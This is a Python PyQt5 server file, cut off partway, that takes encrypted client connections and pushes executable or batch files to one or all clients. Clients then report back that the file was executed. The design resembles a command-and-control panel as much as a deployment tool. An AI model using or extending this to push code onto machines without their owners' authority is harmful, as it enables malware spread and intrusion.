import socket
import os
import struct
import threading
import secrets
import hashlib
import hmac
import logging
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Protocol.KDF import PBKDF2
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.backends import default_backend
from dotenv import load_dotenv
from PyQt5.QtWidgets import (QApplication, QMainWindow, QTextEdit, QPushButton, QVBoxLayout, QHBoxLayout, 
                            QWidget, QFileDialog, QTableWidget, QTableWidgetItem, QToolBar, QStatusBar, 
                            QSplitter, QLabel, QHeaderView, QMessageBox, QMenu, QAction, QSystemTrayIcon,
                            QStyle, QStyleFactory, QGroupBox, QTabWidget, QSpinBox, QLineEdit, QComboBox,
                            QDateTimeEdit, QCheckBox, QFormLayout, QListWidget, QListWidgetItem, QRadioButton,
                            QButtonGroup, QFrame, QDockWidget, QProgressBar, QScrollArea, QStyledItemDelegate)
from PyQt5.QtCore import (pyqtSignal, QThread, Qt, QObject, QMetaObject, Q_ARG, pyqtSlot, QTimer, QSize, 
                         QDateTime, QFileSystemWatcher, QDir, QFile, QEvent)
from PyQt5.QtGui import QFont, QIcon, QColor, QPalette, QLinearGradient, QGradient, QPixmap, QDrag, QDragEnterEvent

import sys
import time
from typing import Optional, Tuple
import tempfile
from plugins import PluginManager, Plugin, FilePlugin, ScriptPlugin
import select

# Setup logging with rotation
from logging.handlers import RotatingFileHandler
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = RotatingFileHandler('server.log', maxBytes=1024*1024, backupCount=5)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
console_handler = logging.StreamHandler()
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)

# Load configuration
load_dotenv(override=True)  # Force reload of environment variables

# Debug environment variables
logger.info("Current working directory: %s", os.getcwd())
logger.info("Environment variables loaded:")
logger.info("SERVER_HOST: %s", os.getenv('SERVER_HOST'))
logger.info("SERVER_PORT: %s", os.getenv('SERVER_PORT'))
logger.info("SERVER_PASSPHRASE: %s", "Set" if os.getenv('SERVER_PASSPHRASE') else "Not Set")

HOST = os.getenv('SERVER_HOST', '127.0.0.1')
PORT = int(os.getenv('SERVER_PORT', 12345))
SERVER_PASSPHRASE = os.getenv('SERVER_PASSPHRASE')

if not SERVER_PASSPHRASE:
    # Try to load from .env file directly
    try:
        with open('.env', 'r') as f:
            for line in f:
                if line.startswith('SERVER_PASSPHRASE='):
                    SERVER_PASSPHRASE = line.split('=', 1)[1].strip()
                    break
    except Exception as e:
        logger.error(f"Error reading .env file: {e}")

if not SERVER_PASSPHRASE:
    raise ValueError("SERVER_PASSPHRASE environment variable is required. Please check your .env file.")

SERVER_PASSPHRASE = SERVER_PASSPHRASE.encode()

# Security constants
MAX_CLIENTS = 50
RATE_LIMIT = 10  # requests per minute
BLOCK_DURATION = 300  # 5 minutes
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
ALLOWED_FILE_TYPES = {'.exe', '.bin', '.bat'}  # Whitelist of allowed file extensions
BUFFER_SIZE = 4096
CONNECTION_TIMEOUT = 30  # Increased from 10 to 30 seconds
HEARTBEAT_INTERVAL = 30  # seconds

# Constants
FRAME_HEADER = struct.Struct('!I')

# Derive AES key from server passphrase
SALT = secrets.token_bytes(16)
BASE_KEY = PBKDF2(SERVER_PASSPHRASE, SALT, dkLen=32, count=100000)

class SecurityError(Exception):
    """Base class for security-related exceptions"""
    pass

def encrypt_data(data: bytes, key: bytes) -> bytes:
    """Encrypt data using AES-GCM with built-in authentication."""
    nonce = secrets.token_bytes(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(data)
    return nonce + tag + ciphertext

def decrypt_data(encrypted_data: bytes, key: bytes) -> bytes:
    """Decrypt data using AES-GCM with built-in authentication."""
    nonce = encrypted_data[:12]
    tag = encrypted_data[12:28]
    ciphertext = encrypted_data[28:]
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)

def compute_hmac(data: bytes, key: bytes) -> bytes:
    return hmac.new(key, data, hashlib.sha256).digest()

def perform_dh_key_exchange(conn: socket.socket) -> bytes:
    """Perform Diffie-Hellman key exchange with the client."""
    try:
        # Set socket to blocking mode for the key exchange
        old_blocking_mode = conn.getblocking()
        conn.setblocking(True)
        
        try:
            # Set a socket timeout just to be safe
            conn.settimeout(15.0)
            
            # Generate DH parameters
            parameters = dh.generate_parameters(generator=2, key_size=2048, backend=default_backend())
            private_key = parameters.generate_private_key()
            public_key = private_key.public_key()
            
            # Convert parameters to PEM format
            param_bytes = parameters.parameter_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.ParameterFormat.PKCS3
            )
            
            # Send parameters to client
            logger.info("Sending DH parameters to client")
            conn.sendall(FRAME_HEADER.pack(len(param_bytes)) + param_bytes)
            logger.info("Successfully sent DH parameters")
            
            # Send our public key
            logger.info("Sending DH public key to client")
            pub_bytes = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            conn.sendall(FRAME_HEADER.pack(len(pub_bytes)) + pub_bytes)
            logger.info("Successfully sent DH public key")
            
            # Receive client's public key
            logger.info("Receiving client public key")
            header = conn.recv(4)
            if not header or len(header) < 4:
                raise SecurityError("Incomplete or no header received for client public key")
                
            length = struct.unpack('!I', header)[0]
            if length > 8192:  # Reasonable max size for public key
                raise SecurityError(f"Invalid public key size: {length}")
                
            logger.info(f"Receiving client public key of length {length}")
            
            # Receive the key data in chunks
            client_pub_bytes = b''
            bytes_received = 0
            chunk_size = 1024
            
            while bytes_received < length:
                chunk = conn.recv(min(chunk_size, length - bytes_received))
                if not chunk:
                    raise SecurityError(f"Connection closed while receiving client public key ({bytes_received}/{length} bytes received)")
                client_pub_bytes += chunk
                bytes_received += len(chunk)
                
            if bytes_received != length:
                raise SecurityError(f"Incomplete client public key received: {bytes_received}/{length} bytes")
                
            logger.info("Successfully received client public key")
            
            # Load client public key and compute shared secret
            logger.info("Loading client public key and computing shared secret")
            client_pub_key = serialization.load_pem_public_key(client_pub_bytes, backend=default_backend())
            shared_secret = private_key.exchange(client_pub_key)
            session_key = hashlib.sha256(shared_secret).digest()
            
            logger.info("DH key exchange completed successfully")
            return session_key
            
        except Exception as e:
            logger.error(f"DH key exchange failed: {e}")
            raise SecurityError(f"Key exchange failed: {e}")
        
    finally:
        # Restore original blocking mode
        try:
            conn.setblocking(old_blocking_mode)
        except:
            pass
        
        # Clear socket timeout
        try:
            conn.settimeout(None)
        except:
            pass

def send_framed_message(conn: socket.socket, data: bytes, key: bytes) -> None:
    """Send a framed message with built-in authentication."""
    try:
        # Encrypt the data with AES-GCM
        encrypted_data = encrypt_data(data, key)
        
        # Create the message with length prefix
        message = FRAME_HEADER.pack(len(encrypted_data)) + encrypted_data
        
        # Send the complete message
        conn.sendall(message)
    except Exception as e:
        logger.error(f"Error sending framed message: {e}")
        raise

def send_file(conn: socket.socket, file_path: str, key: bytes) -> bool:
    try:
        if not os.path.exists(file_path):
            raise FileNotFoundError(f"File not found: {file_path}")
            
        file_size = os.path.getsize(file_path)
        if file_size > MAX_FILE_SIZE:
            raise SecurityError(f"File too large: {file_size} bytes")
            
        logger.info(f"Reading file: {file_path}, size: {file_size} bytes")
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        # Check socket state before starting
        if not socket_is_alive(conn):
            logger.error("Socket appears to be closed or in error state")
            return False
            
        # Calculate and send file hash
        file_hash = hashlib.sha256(file_data).hexdigest()
        logger.info(f"Sending file hash: {file_hash[:8]}...")
        
        try:
            encrypted_hash = encrypt_data(file_hash.encode(), key)
            conn.sendall(FRAME_HEADER.pack(len(encrypted_hash)) + encrypted_hash)
        except socket.error as e:
            logger.error(f"Socket error while sending file hash: {e}")
            return False
        except Exception as e:
            logger.error(f"Error sending file hash: {e}")
            return False
            
        # Check socket state before continuing
        if not socket_is_alive(conn):
            logger.error("Socket closed after sending file hash")
            return False
        
        # Send file size
        logger.info(f"Sending file size: {len(file_data)} bytes")
        try:
            size_bytes = struct.pack('!Q', len(file_data))
            encrypted_size = encrypt_data(size_bytes, key)
            conn.sendall(FRAME_HEADER.pack(len(encrypted_size)) + encrypted_size)
        except socket.error as e:
            logger.error(f"Socket error while sending file size: {e}")
            return False
        except Exception as e:
            logger.error(f"Error sending file size: {e}")
            return False
            
        # Check socket state before continuing
        if not socket_is_alive(conn):
            logger.error("Socket closed after sending file size")
            return False
        
        # Send encrypted file data
        logger.info("Encrypting and sending file data...")
        try:
            encrypted_file = encrypt_data(file_data, key)
            logger.info(f"Sending {len(encrypted_file)} bytes of encrypted file data")
            conn.sendall(FRAME_HEADER.pack(len(encrypted_file)) + encrypted_file)
        except socket.error as e:
            logger.error(f"Socket error while sending file data: {e}")
            return False
        except Exception as e:
            logger.error(f"Error sending file data: {e}")
            return False
        
        logger.info(f"File {os.path.basename(file_path)} sent successfully")
        return True
    except Exception as e:
        logger.error(f"Error sending file: {e}")
        return False

def socket_is_alive(sock: socket.socket) -> bool:
    """Check if a socket is still connected and usable"""
    if sock is None:
        return False
        
    try:
        # Check if socket is readable/writable with a short timeout
        readable, writable, _ = select.select([sock], [sock], [], 0.1)
        
        if readable and not writable:
            # Socket is readable but not writable, might be closed
            # Try to peek at incoming data
            try:
                data = sock.recv(1, socket.MSG_PEEK)
                if len(data) == 0:  # Connection closed by peer
                    return False
            except:
                return False
                
        return writable  # If writable, socket is probably still usable
    except:
        return False  # Any exception means socket is not usable

class SignalHandler(QObject):
    log_signal = pyqtSignal(str)
    add_client_signal = pyqtSignal(tuple)
    remove_client_signal = pyqtSignal(tuple)
    update_client_status_signal = pyqtSignal(tuple, str)
    update_gui_signal = pyqtSignal()  # New signal for GUI updates

class ClientHandler(QThread):
    def __init__(self, conn: socket.socket, addr: tuple, signal_handler: SignalHandler):
        super().__init__()
        self.conn = conn
        self.addr = addr
        self.signal_handler = signal_handler
        self.session_key = None
        self.running = True
        self.last_heartbeat = datetime.now()
        self.heartbeat_timeout = 90
        
    def run(self):
        try:
            self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            if sys.platform == 'win32':
                self.conn.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 30000, 10000))
            self.conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            # Increase buffer sizes for better performance
            self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)  # 256KB
            self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # 256KB

            # 1. Add client to GUI first with minimal status updates
            QMetaObject.invokeMethod(self.signal_handler, "add_client_signal",
                                   Qt.QueuedConnection,
                                   Q_ARG(tuple, self.addr))

            # 2. Perform key exchange
            try:
                # Skip intermediate status updates during key exchange to reduce UI load
                self.session_key = perform_dh_key_exchange(self.conn)
                # Only update status after successful key exchange
                QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                       Qt.QueuedConnection,
                                       Q_ARG(tuple, self.addr),
                                       Q_ARG(str, "Authenticated"))
            except SecurityError as e:
                logger.error(f"Key exchange failed for {self.addr}: {e}")
                QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                       Qt.QueuedConnection,
                                       Q_ARG(tuple, self.addr),
                                       Q_ARG(str, "Key Exchange Failed"))
                self.running = False 
            except socket.timeout as e:
                logger.error(f"Key exchange timed out for {self.addr}: {e}")
                QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                       Qt.QueuedConnection,
                                       Q_ARG(tuple, self.addr),
                                       Q_ARG(str, "Key Exchange Timeout"))
                self.running = False
            except Exception as e:
                logger.error(f"Unexpected error during key exchange for {self.addr}: {e}")
                QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                       Qt.QueuedConnection,
                                       Q_ARG(tuple, self.addr),
                                       Q_ARG(str, "Key Exchange Error"))
                self.running = False
            
            if not self.running:
                return
            
            # Set socket to non-blocking after key exchange
            self.conn.setblocking(False)
            
            # Use a buffer for messages to reduce GUI updates
            message_buffer = []
            last_update = time.time()
            update_interval = 1.0  # Increased to 1 second to reduce UI load
            max_buffer_size = 50  # Limit buffer size to prevent memory issues
            
            while self.running:
                try:
                    # Check for heartbeat timeout
                    if (datetime.now() - self.last_heartbeat).total_seconds() > self.heartbeat_timeout:
                        logger.warning(f"Client {self.addr} heartbeat timeout")
                        break

                    # Use select with a short timeout
                    ready = select.select([self.conn], [], [], 0.1)
                    if not ready[0]:
                        # Process buffer if it's getting too large or enough time has passed
                        current_time = time.time()
                        if (len(message_buffer) >= max_buffer_size or 
                            (current_time - last_update >= update_interval and message_buffer)):
                            self._process_message_buffer(message_buffer)
                            message_buffer = []
                            last_update = current_time
                        continue

                    try:
                        header = self.conn.recv(4)
                        if not header:
                            break
                            
                        length = struct.unpack('!I', header)[0]
                        if length > MAX_FILE_SIZE:
                            raise SecurityError("Message size exceeds maximum allowed size")
                        
                        # Read all data at once
                        encrypted_data = self.conn.recv(length)
                        if len(encrypted_data) != length:
                            raise SecurityError("Incomplete message received")
                        
                        message = decrypt_data(encrypted_data, self.session_key).decode()
                        self.last_heartbeat = datetime.now()
                        
                        if message == "HEARTBEAT":
                            # Respond to heartbeat immediately
                            send_framed_message(self.conn, b"HEARTBEAT", self.session_key)
                            # Don't buffer heartbeats to reduce UI updates
                        elif message == "EXECUTED":
                            message_buffer.append(("update_status", "Executed"))
                        else:
                            message_buffer.append(("log", message))
                            
                        # Process buffer if it's getting too large
                        if len(message_buffer) >= max_buffer_size:
                            self._process_message_buffer(message_buffer)
                            message_buffer = []
                            last_update = time.time()
                            
                    except BlockingIOError:
                        continue
                    except Exception as e:
                        logger.error(f"Error processing message from {self.addr}: {e}")
                        break
                        
                except Exception as e:
                    logger.error(f"Error in client loop for {self.addr}: {e}")
                    break
                
        except Exception as e:
            logger.error(f"Error with client {self.addr}: {e}")
        finally:
            try:
                self.conn.close()
            except:
                pass
            QMetaObject.invokeMethod(self.signal_handler, "remove_client_signal",
                                   Qt.QueuedConnection,
                                   Q_ARG(tuple, self.addr))

    def stop_thread(self):
        logger.debug(f"Stopping ClientHandler thread for {self.addr}...")
        self.running = False
        if self.conn:
            try:
                self.conn.shutdown(socket.SHUT_RDWR)
            except (socket.error, OSError):
                pass # Socket might already be closed or in a bad state
            finally:
                try:
                    self.conn.close()
                except (socket.error, OSError):
                    pass # Ignore further errors on close
        self.quit() # Request QThread's event loop to exit (if it was started)
        logger.debug(f"ClientHandler thread for {self.addr} signaled to stop.")

    def _process_message_buffer(self, message_buffer):
        """Process buffered messages in a single GUI update"""
        try:
            for msg_type, content in message_buffer:
                if msg_type == "update_status":
                    QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                           Qt.QueuedConnection,
                                           Q_ARG(tuple, self.addr),
                                           Q_ARG(str, content))
                elif msg_type == "log":
                    QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                           Qt.QueuedConnection,
                                           Q_ARG(str, f"Client {self.addr}: {content}"))
        except Exception as e:
            logger.error(f"Error processing message buffer: {e}")

    def send_file_to_client(self, file_path: str) -> bool:
        if not os.path.exists(file_path):
            logger.error(f"File {file_path} not found")
            return False
            
        try:
            if not self.session_key:
                logger.error(f"No session key for {self.addr}")
                return False
            
            # First check if client is still connected
            try:
                # Use select to check if socket is writable with timeout
                readable, writable, exceptional = select.select([], [self.conn], [self.conn], 2.0)
                if not writable or exceptional:
                    logger.error(f"Socket to {self.addr} not ready for writing")
                    return False
            except Exception as e:
                logger.error(f"Error checking socket to {self.addr}: {e}")
                return False
                
            # Notify client about incoming file
            logger.info(f"Sending FILE_TRANSFER command to {self.addr}")
            command = b"FILE_TRANSFER"
            try:
                encrypted_command = encrypt_data(command, self.session_key)
                # Set socket back to blocking mode temporarily to ensure complete send
                self.conn.setblocking(True)
                self.conn.sendall(FRAME_HEADER.pack(len(encrypted_command)) + encrypted_command)
            except Exception as e:
                logger.error(f"Error sending FILE_TRANSFER command to {self.addr}: {e}")
                self.conn.setblocking(False)  # Restore non-blocking mode
                return False

            # Calculate file hash
            file_hash = hashlib.sha256()
            with open(file_path, 'rb') as f:
                while chunk := f.read(8192):  # Read in 8KB chunks
                    file_hash.update(chunk)
            file_hash = file_hash.hexdigest()
            
            # Send file hash
            encrypted_hash = encrypt_data(file_hash.encode(), self.session_key)
            self.conn.sendall(FRAME_HEADER.pack(len(encrypted_hash)) + encrypted_hash)
            
            # Send file size
            file_size = os.path.getsize(file_path)
            encrypted_size = encrypt_data(struct.pack('!Q', file_size), self.session_key)
            self.conn.sendall(FRAME_HEADER.pack(len(encrypted_size)) + encrypted_size)
            
            # Send file data in chunks
            chunk_size = 32768  # 32KB chunks
            total_sent = 0
            last_progress = 0
            
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                        
                    encrypted_chunk = encrypt_data(chunk, self.session_key)
                    self.conn.sendall(FRAME_HEADER.pack(len(encrypted_chunk)) + encrypted_chunk)
                    
                    total_sent += len(chunk)
                    progress = int(total_sent * 100 / file_size)
                    
                    # Log progress every 10%
                    if progress - last_progress >= 10:
                        logger.info(f"File transfer progress: {progress}%")
                        last_progress = progress
            
            logger.info(f"File transfer completed: {file_path}")
            return True
            
        except Exception as e:
            logger.error(f"Error sending file to {self.addr}: {e}")
            return False
        finally:
            self.conn.setblocking(False)  # Restore non-blocking mode

class RateLimiter:
    def __init__(self, limit: int, window: int):
        self.limit = limit
        self.window = window
        self.requests = {}
        self.blocked = {}

    def is_allowed(self, addr: tuple) -> bool:
        current_time = time.time()
        
        # Check if IP is blocked
        if addr in self.blocked:
            if current_time - self.blocked[addr] < BLOCK_DURATION:
                return False
            del self.blocked[addr]
        
        # Clean old requests
        if addr in self.requests:
            self.requests[addr] = [t for t in self.requests[addr] if current_time - t < self.window]
        else:
            self.requests[addr] = []
        
        # Check rate limit
        if len(self.requests[addr]) >= self.limit:
            self.blocked[addr] = current_time
            return False
        
        self.requests[addr].append(current_time)
        return True

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.rate_limiter = RateLimiter(RATE_LIMIT, 60)
        self.lock = threading.Lock()

    def add_client(self, addr: tuple, handler: 'ClientHandler') -> bool:
        with self.lock:
            if len(self.clients) >= MAX_CLIENTS:
                return False
            if not self.rate_limiter.is_allowed(addr):
                return False
            self.clients[addr] = handler
            return True

    def remove_client(self, addr: tuple):
        with self.lock:
            if addr in self.clients:
                del self.clients[addr]

    def get_client(self, addr: tuple) -> Optional['ClientHandler']:
        with self.lock:
            return self.clients.get(addr)

    def get_all_clients(self) -> dict:
        with self.lock:
            return self.clients.copy()

class FileSenderThread(QThread):
    def __init__(self, client_manager: ClientManager, file_path: str, signal_handler: SignalHandler, addr: tuple = None):
        super().__init__()
        self.client_manager = client_manager
        self.file_path = file_path
        self.signal_handler = signal_handler
        self.addr = addr
        self.finished.connect(self.deleteLater)  # Ensure proper cleanup
        self.success = False

    def run(self):
        try:
            if self.addr:
                # Sending to a specific client
                client = self.client_manager.get_client(self.addr)
                if client:
                    logger.info(f"FileSenderThread: Sending {self.file_path} to client {self.addr}")
                    if not hasattr(client, 'session_key') or not client.session_key:
                        QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                              Qt.QueuedConnection,
                                              Q_ARG(str, f"Error: Client {self.addr} has no secure session established"))
                        return
                    
                    success = client.send_file_to_client(self.file_path)
                    if success:
                        self.success = True
                        QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                              Qt.QueuedConnection,
                                              Q_ARG(str, f"Successfully sent {os.path.basename(self.file_path)} to {self.addr}"))
                    else:
                        QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                              Qt.QueuedConnection,
                                              Q_ARG(str, f"Failed to send {os.path.basename(self.file_path)} to {self.addr}"))
                else:
                    QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                          Qt.QueuedConnection,
                                          Q_ARG(str, f"Client {self.addr} not found for file transfer"))
            else:
                # Sending to all clients
                clients = list(self.client_manager.get_all_clients().items())
                total_clients = len(clients)
                success_count = 0
                
                if total_clients == 0:
                    QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                           Qt.QueuedConnection,
                                           Q_ARG(str, "No clients connected to send file to"))
                    return
                
                for addr, client in clients:
                    if hasattr(client, 'session_key') and client.session_key:
                        if client.send_file_to_client(self.file_path):
                            success_count += 1
                
                self.success = success_count > 0
                
                QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                        Qt.QueuedConnection,
                                        Q_ARG(str, f"File sent to {success_count}/{total_clients} clients"))
        except Exception as e:
            logger.error(f"Error in FileSenderThread: {e}")
            QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                   Qt.QueuedConnection,
                                   Q_ARG(str, f"Error sending file: {e}"))

class ServerThread(QThread):
    def __init__(self, signal_handler: SignalHandler):
        super().__init__()
        self.signal_handler = signal_handler
        self.client_manager = ClientManager()
        self.server = None
        self.running = True
        self.lock = threading.Lock()
        self.file_sender_threads = []

    def run(self):
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            if sys.platform == 'win32':
                self.server.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 30000, 10000))
            self.server.bind((HOST, PORT))
            self.server.listen(MAX_CLIENTS)
            self.server.setblocking(False)  # Set non-blocking mode
            
            QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                   Qt.QueuedConnection,
                                   Q_ARG(str, f"Server listening on {HOST}:{PORT}"))
            
            while self.running:
                try:
                    # Use select with a short timeout
                    ready = select.select([self.server], [], [], 0.1)
                    if not ready[0]:
                        continue

                    try:
                        conn, addr = self.server.accept()
                        
                        if not self.client_manager.rate_limiter.is_allowed(addr):
                            conn.close()
                            continue
                        
                        client_handler = ClientHandler(conn, addr, self.signal_handler)
                        if self.client_manager.add_client(addr, client_handler):
                            client_handler.start()
                    except BlockingIOError:
                        continue
                    except Exception as e:
                        QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                               Qt.QueuedConnection,
                                               Q_ARG(str, f"Error accepting connection: {e}"))
                        continue
                        
                except Exception as e:
                    QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                           Qt.QueuedConnection,
                                           Q_ARG(str, f"Server loop error: {e}"))
                    continue
                    
        except Exception as e:
            QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                   Qt.QueuedConnection,
                                   Q_ARG(str, f"Server error: {e}"))
        finally:
            if self.server:
                try:
                    self.server.close()
                except:
                    pass
            logger.info("ServerThread run method finished.")

    def stop(self):
        logger.info("ServerThread.stop() called.")
        self.running = False # Stop server loop from accepting new connections

        if self.server:
            try:
                self.server.close() # Close main server socket early
                logger.info("Main server socket closed.")
            except Exception as e:
                logger.error(f"Error closing server socket: {e}")

        # Gracefully stop all client handlers
        client_handlers_copy = list(self.client_manager.get_all_clients().values())
        logger.info(f"Attempting to stop {len(client_handlers_copy)} client handlers...")
        for handler in client_handlers_copy:
            try:
                logger.debug(f"Stopping client handler for {getattr(handler, 'addr', 'N/A')}...")
                if hasattr(handler, 'stop_thread'):
                    handler.stop_thread() # Signal to stop its loop and close its socket
                else: # Fallback if stop_thread is missing for some reason
                    handler.running = False
                    if handler.conn:
                        try: handler.conn.close()
                        except: pass
                
                if handler.isRunning():
                    if not handler.wait(1000): # Wait for 1 second for each client thread
                        logger.warning(f"Client handler {getattr(handler, 'addr', 'N/A')} did not terminate in time.")
                logger.debug(f"Client handler for {getattr(handler, 'addr', 'N/A')} processed for shutdown.")
            except Exception as e:
                logger.error(f"Error during shutdown of client handler {getattr(handler, 'addr', 'N/A')}: {e}")
        logger.info(f"Finished attempting to stop client handlers.")
        
        # Wait for all file sender threads to finish
        threads_to_wait = list(self.file_sender_threads) # Make a copy
        logger.info(f"Attempting to wait for {len(threads_to_wait)} file sender threads...")
        for thread in threads_to_wait:
            try:
                if thread.isRunning():
                    if not thread.wait(1000): # Wait with timeout
                        logger.warning("A file sender thread did not terminate in time.")
            except Exception as e:
                logger.error(f"Error waiting for file sender thread: {e}")
        logger.info("Finished waiting for file sender threads.")

        logger.info("Stopping ServerThread QThread instance itself...")
        self.quit() # For QThread's event loop, if it were used by a subclass not overriding run()
        if self.isRunning():
            if not self.wait(3000): # Wait for ServerThread's run() method to exit
                logger.warning("ServerThread's run() method did not terminate in time.")
        logger.info("ServerThread.stop() finished.")

    def send_file_to_client(self, file_path: str, addr: tuple = None, retry_count=0, max_retries=3):
        """Send a file to a client with retry capability if session key isn't established yet"""
        # Check if file exists
        if not os.path.exists(file_path):
            logger.error(f"File not found: {file_path}")
            self.signal_handler.log_signal.emit(f"File not found: {file_path}")
            return False
        
        # Log the file info    
        file_size = os.path.getsize(file_path)
        file_ext = os.path.splitext(file_path)[1].lower()
        logger.info(f"File: {os.path.basename(file_path)}, Size: {file_size} bytes, Type: {file_ext}")
            
        # Check file type
        if file_ext not in ALLOWED_FILE_TYPES:
            logger.error(f"File type not allowed: {file_ext}")
            self.signal_handler.log_signal.emit(f"File type not allowed: {file_ext}")
            return False
            
        # Check file size    
        if file_size > MAX_FILE_SIZE:
            logger.error(f"File too large: {file_size} bytes (max: {MAX_FILE_SIZE} bytes)")
            self.signal_handler.log_signal.emit(f"File too large: {file_path}")
            return False
        
        # Handle empty files
        if file_size == 0:
            logger.warning(f"File is empty: {file_path}")
            self.signal_handler.log_signal.emit(f"Warning: File is empty: {os.path.basename(file_path)}")
            # Continue anyway
        
        # If sending to a specific client
        if addr:
            client = self.client_manager.get_client(addr)
            if not client:
                logger.error(f"No client found with address {addr}")
                self.signal_handler.log_signal.emit(f"No client found with address {addr}")
                return False

            # Check if session key is established
            if not hasattr(client, 'session_key') or not client.session_key:
                # If we've reached max retries, give up
                if retry_count >= max_retries:
                    logger.error(f"Failed to send file to {addr} after {max_retries} attempts: no session key established")
                    self.signal_handler.log_signal.emit(f"Failed to send file to {addr}: no secure connection")
                    return False
                
                # Otherwise retry after a delay
                logger.info(f"No session key for {addr}, retry {retry_count+1}/{max_retries+1} in 2s")
                delay = 2000  # 2 seconds
                QTimer.singleShot(delay, lambda: self.send_file_to_client(file_path, addr, retry_count + 1, max_retries))
                return True  # Return True to indicate we're still working on it
            
        # Log the sending operation
        logger.info(f"Sending file {file_path} to {addr if addr else 'all clients'}")
        self.signal_handler.log_signal.emit(f"Sending file {os.path.basename(file_path)} to {addr if addr else 'all clients'}")
            
        # Create and start file sender thread
        sender_thread = FileSenderThread(self.client_manager, file_path, self.signal_handler, addr)
        self.file_sender_threads.append(sender_thread)  # Keep reference to thread
        sender_thread.finished.connect(lambda: self.file_sender_threads.remove(sender_thread))  # Remove when done
        sender_thread.start()
        
        return True

class LogType:
    CONNECTION = "Connection"
    FILE_TRANSFER = "File Transfer"
    COMMAND = "Command"
    SYSTEM = "System"
    ERROR = "Error"

class AutomationTask:
    def __init__(self, name, file_path=None, script=None, schedule=None, target_clients=None, execute_on_connect=False):
        self.name = name
        self.file_path = file_path
        self.script = script
        self.schedule = schedule
        self.target_clients = target_clients or []
        self.execute_on_connect = execute_on_connect
        self.last_run = None
        self.enabled = True  # Default to enabled
        self.status = "Ready"  # Current status (Ready, Running, Failed, Completed)

class ServerGUI(QMainWindow):
    # Auto Tasks methods
    def refresh_auto_tasks_files(self, path=None):
        """Refresh the list of available files in the autotasks directory"""
        try:
            self.files_list.clear()
            if os.path.exists(self.auto_tasks_dir):
                for file in os.listdir(self.auto_tasks_dir):
                    file_path = os.path.join(self.auto_tasks_dir, file)
                    if os.path.isfile(file_path):
                        item = QListWidgetItem(file)
                        item.setToolTip(file_path)
                        # Add icon based on file type
                        if file.endswith('.exe'):
                            item.setIcon(self.style().standardIcon(QStyle.SP_FileDialogDetailedView))
                        elif file.endswith('.bat'):
                            item.setIcon(self.style().standardIcon(QStyle.SP_FileDialogContentsView))
                        else:
                            item.setIcon(self.style().standardIcon(QStyle.SP_FileIcon))
                        self.files_list.addItem(item)
        except Exception as e:
            logger.error(f"Error refreshing auto tasks files: {e}")

    def add_task_file(self):
        """Add a file to the auto tasks directory"""
        try:
            file_path, _ = QFileDialog.getOpenFileName(
                self, 
                "Select File to Add", 
                "", 
                "Executable Files (*.exe);;Batch Files (*.bat);;All Files (*.*)"
            )
            
            if file_path:
                file_name = os.path.basename(file_path)
                dest_path = os.path.join(self.auto_tasks_dir, file_name)
                
                # Check if file already exists
                if os.path.exists(dest_path):
                    reply = QMessageBox.question(
                        self, 
                        "File Already Exists",
                        f"The file '{file_name}' already exists in the auto tasks directory. Replace it?",
                        QMessageBox.Yes | QMessageBox.No,
                        QMessageBox.No
                    )
                    if reply != QMessageBox.Yes:
                        return
                
                # Copy the file to auto tasks directory
                import shutil
                shutil.copy2(file_path, dest_path)
                
                # Add to file list (will be picked up by the file watcher)
                self.refresh_auto_tasks_files()
                
                QMessageBox.information(
                    self,
                    "File Added",
                    f"The file '{file_name}' has been added to auto tasks."
                )
        except Exception as e:
            logger.error(f"Error adding task file: {e}")
            QMessageBox.critical(
                self,
                "Error",
                f"Failed to add task file: {e}"
            )

    def open_tasks_folder(self):
        """Open the auto tasks folder in the file explorer"""
        try:
            import subprocess
            folder_path = os.path.abspath(self.auto_tasks_dir)
            if os.path.exists(folder_path):
                if sys.platform == 'win32':
                    os.startfile(folder_path)
                else:
                    subprocess.Popen(['xdg-open', folder_path])
